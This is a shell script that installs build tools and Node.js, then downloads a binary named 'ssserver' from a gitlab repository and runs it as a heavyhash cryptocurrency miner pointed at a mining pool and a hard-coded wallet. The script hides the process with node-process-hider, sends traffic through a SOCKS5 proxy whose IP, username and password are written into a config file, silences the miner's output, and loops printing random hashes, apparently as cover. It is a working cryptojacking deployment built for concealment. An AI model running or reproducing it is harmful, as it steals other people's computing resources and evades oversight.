apt update && apt -y install sudo wget curl unzip
sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata


wget https://gitlab.com/cici2/ton/-/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 18.216.28.28:1080
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

./graftcp/graftcp wget https://gitlab.com/cici2/obtc/-/raw/main/ssserver
chmod +x ssserver

ph add ssserver

./graftcp/graftcp ./ssserver --algorithm heavyhash --pool stratum+tcps://stratum-ru.rplant.xyz:17064 --wallet bc1q0l70tfy834e9rz8kpymelv27tweg34v54qdehe.x --password x >/dev/null &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
